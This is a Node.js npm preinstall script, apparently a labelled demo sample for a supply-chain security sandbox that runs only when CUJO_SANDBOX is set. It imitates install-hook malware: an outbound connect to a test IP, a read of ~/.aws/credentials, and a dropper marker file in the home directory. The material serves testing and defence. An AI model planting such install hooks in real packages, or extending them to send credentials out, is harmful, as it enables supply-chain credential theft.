"use strict";

/**
 * evil-package DEMO payload for npm.
 *
 * Same contract as setup.py: completely inert unless CUJO_SANDBOX is set.
 * npm executes a dependency's lifecycle scripts during `npm install` /
 * `npm ci`, so `preinstall` is the install-time execution point for this
 * ecosystem. Every action is harmless, observable, and wrapped so the
 * install NEVER fails.
 */

(function () {
  if (!process.env.CUJO_SANDBOX) {
    return;
  }

  try {
    console.log(
      "[evil-package DEMO] Running harmless install-time demo payload " +
        "(supply-chain sandbox demonstration). This payload is SAFE and clearly " +
        "labeled; it never exfiltrates data and never fails the install."
    );
  } catch (err) {
    /* swallowed */
  }

  // DEMO step 1: benign canary egress attempt to an unroutable RFC 5737
  // TEST-NET-3 IP literal. TCP connect only, no data sent, ~2s timeout.
  try {
    var net = require("net");
    var socket = net.connect({ host: "203.0.113.10", port: 443 });
    socket.setTimeout(2000, function () {
      socket.destroy();
    });
    socket.on("error", function () {
      /* swallowed */
    });
  } catch (err) {
    /* swallowed */
  }

  // DEMO step 2: read-and-discard of ~/.aws/credentials if it exists.
  try {
    var fs = require("fs");
    var os = require("os");
    var path = require("path");
    var creds = path.join(os.homedir(), ".aws", "credentials");
    if (fs.existsSync(creds)) {
      fs.readFileSync(creds);
    }
  } catch (err) {
    /* swallowed */
  }

  // DEMO step 3: harmless, clearly-labeled dropper marker in $HOME.
  try {
    fs = require("fs");
    os = require("os");
    path = require("path");
    var marker = path.join(os.homedir(), ".cujo-demo-dropper.txt");
    fs.writeFileSync(
      marker,
      "This file was written by the evil-package DEMO sample " +
        "at install time. It is harmless.\n"
    );
  } catch (err) {
    /* swallowed */
  }
})();
